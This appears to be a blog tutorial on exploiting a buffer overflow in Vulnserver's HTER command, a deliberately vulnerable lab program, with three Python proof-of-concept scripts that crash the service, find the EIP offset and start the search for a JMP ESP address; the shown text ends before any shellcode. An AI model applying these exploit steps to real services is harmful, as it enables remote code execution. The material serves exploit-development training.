---
layout: post
title: Vulnserver HTER - Vanilla BOF & Character Conversion
date: 2020-03-08 18:00:00
categories: posts
comments: false
en: true
---

# Introduction

### In order to finish with the eccentric cases that vulnserver may offer us, today we will be seeing an odd case of a buffer overflow with a character conversion, meaning that the received bytes are parsed as expected. Nonetheless, the alphanumeric bytes suffer from no change whatsoever and are not ported as hex. For example, if the EIP is overflown with 1000 bytes of A's, the EIP may not reveal 41414141, instead, it will place "AAAAAAAA".

### The basics

##### As with any other vulnerable applicaiton to a buffer overflow, we need to test it first in order to exploit it, let's try with HTER + long string of bytes.

###### PoC code:

```term
import socket, sys

host = sys.argv[1]

buffer = "HTER " + "A" * 5000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, 9999))

s.send(buffer)

s.close()
```

#### Crash I

![](/assets/img/HTER/1.png)

##### Gaze at the EIP for a bit, look how instead of converting the sent bytes into hex (41), it just parsed them as how they went dispatched.
##### As there is no pattern available in order to obtain the offset, the best method is to deduce with the use of elimination process.

###### PoC code:

```term
import socket, sys

host = sys.argv[1]

buffer = "HTER " + "A" * 2000 + "B" * 1000 + "C" * 1000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, 9999))

s.send(buffer)

s.close()
```

##### Crash II

![](/assets/img/HTER/2.png)

##### As displayed, it appears as now the B's are the culprit for the overflow. After this process was replicated on multiple occasions, it was found for the offset to be 2041.
##### Furthermore, in order to overwrite the EIP, it is needed to cover the extra space that the opcodes commonly occupy, meaning that it is required to send 8 B's, instead of 4.

###### PoC code:

```term
import socket, sys

host = sys.argv[1]

buffer = "HTER " + "A" * 2041 + "BBBBBBBB" + "FF" * 200

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, 9999))

s.send(buffer)

s.close()
```

##### Crash III

![](/assets/img/HTER/3.png)

#### Hijacking the execution

##### As with any other buffer overflow, it is now essential to find an address with a JMP ESP instruction, which will allow us to execute any type of code with no restrictions whatsoever.

###### Enumerating the modules

![](/assets/img/HTER/4.png)


  
  
  

